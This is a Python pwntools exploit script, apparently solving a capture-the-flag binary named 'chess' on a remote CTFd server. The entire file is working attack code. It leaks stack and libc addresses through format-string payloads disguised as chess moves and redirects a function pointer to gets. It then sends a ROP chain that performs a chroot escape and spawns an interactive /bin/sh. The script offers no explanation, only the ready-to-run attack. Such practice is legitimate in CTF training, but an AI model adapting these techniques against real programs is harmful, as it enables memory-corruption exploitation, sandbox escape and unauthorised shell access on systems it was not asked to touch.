from pwn import *
from binascii import hexlify
from base64 import b64encode
import sys, os

LOCAL = False
HOST, PORT = 'challenges.ctfd.io', 30458
FILE = '/home/ubuntu/chess'

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

e = ELF(os.path.basename(FILE))

if LOCAL:
	r = process(FILE)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	# libc_start_main_offset = 0x270b3
	libc_start_main_offset = 0x20840
	frame_size = 208
else:
	r = remote(HOST, PORT)
	libc = ELF('./libc6_2.23.so')
	libc_start_main_offset = 0x20840
	frame_size = 208

if LOCAL and 'gdb' in sys.argv:
	# gdb.attach(r, 'break *0x401CD4')
	gdb.attach(r, '')
	# gdb.attach(r, 'break *0x4019AA')


def ret2main(stack):
	log.info(f'STAAAACK {hex(stack)}')
	ret_at = stack + 0xa8
	payload = fmtstr_payload(22, {ret_at: 0xE0}, write_size='short', numbwritten=80)
	r.sendlineafter('\n\n', b'Qg7 ' + payload)

	payload = fmtstr_payload(23, {ret_at + 1: 0x4010}, write_size='short', numbwritten=88)
	r.sendlineafter('\n\n', b'Kd2 ' + b'AAA' + payload)
	r.recvuntil('3) Quit')

	return stack - frame_size

def get_stack_addr():
	r.sendlineafter('\n', '1')
	r.sendlineafter('\n', 'my name')

	payload = b'CCCCCCCC%5$p'
	r.sendlineafter('\n\n', b'Ra1 ' + payload)

	r.recvuntil('Ra1 CCCCCCCC')
	stack = int(r.recvline()[:-1], 16)	
	log.info(f'stack = {hex(stack)}')

	return ret2main(stack)

def get_libc_addr():
	r.sendlineafter('\n', '1')
	r.sendlineafter('\n', 'my name')

	payload = b'CCCCCCCC%33$p'
	r.sendlineafter('\n\n', b'Ra1 ' + payload)

	r.recvuntil('Ra1 CCCCCCCC')
	libc_start_main = int(r.recvline()[:-1], 16)	
	log.warning(hex(libc_start_main))
	return libc_start_main-libc_start_main_offset, ret2main(stack)

def write_byte_custom(stack, addr, val, pos=23, numbwritten=88):
	r.sendlineafter('\n', '1')
	r.sendlineafter('\n', 'my name')

	log.warning(f'writing {hex(val)} to {hex(addr)}')
	payload = fmtstr_payload(23, {addr: val}, write_size='int', numbwritten=88)
	log.info(payload)

	# payload = b'%10904c%25$hhnaaAAAAAAAA'
	payload = f'%{val-numbwritten}c'
	payload += f'%{pos+2}'
	payload += '$hnaaa'
	payload = payload.encode()
	payload += addr.to_bytes(8, 'little')
	log.info(payload)

	r.sendlineafter('\n\n', b'Ra1 ' + b'A' * 2  + payload)

	return ret2main(stack)

# getting zeroed stack, so we can write to address starting with 0x0000
stack = get_stack_addr()
log.success(f'stack = {hex(stack)}')

stack = get_stack_addr()
log.success(f'stack = {hex(stack)}')

stack = get_stack_addr()
log.success(f'stack = {hex(stack)}')

libc_address, stack = get_libc_addr()
log.success(f'stack = {hex(stack)}')
log.success(f'libc = {hex(libc_address)}')
libc.address = libc_address

libc_gets = libc.symbols['gets']
log.info(f'GETS = {hex(libc_gets)}')

stack = get_stack_addr()
ret_at = stack + 0xa8
log.success(f'stack = {hex(stack)}')
log.success(f'ret_at = {hex(ret_at)}')

log.info(hex(libc_gets))
stack = write_byte_custom(stack, 0x404040, int(hex(libc_gets)[-4:], 16))
rop_buff = stack + 168
log.info(f'stack = {hex(stack)}')
log.info(f'rop_buff = {hex(rop_buff)}')

payload = b'A' * 0xb0
# payload += b'C' * 8

rop = ROP(libc, base=rop_buff)
rop.call('mkdir', ['.t2', 755])
rop.call('chroot', ['.t2'])
rop.call('chroot', ['../../../../../../../../../../../../../../../..'])
rop.call('execl', ['/bin/sh', '-i', 0])
print(rop.dump())
print(hexlify(rop.chain()))
payload += rop.chain()

r.sendline(payload)
r.interactive()
